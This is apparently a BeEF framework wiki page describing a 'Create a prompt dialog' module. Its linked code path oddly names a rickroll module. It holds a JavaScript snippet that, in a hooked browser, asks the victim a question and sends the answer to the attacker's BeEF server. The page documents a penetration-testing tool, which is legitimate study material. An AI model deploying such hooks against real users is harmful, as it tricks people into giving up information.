## Summary

* **Objective**: Create a prompt dialog
* **Authors**: wade, bm
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/browser/hooked_domain/rickroll)

## Internal Working


```js

var answer = prompt("<%== @question %>","")
beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);

```

## Feedback

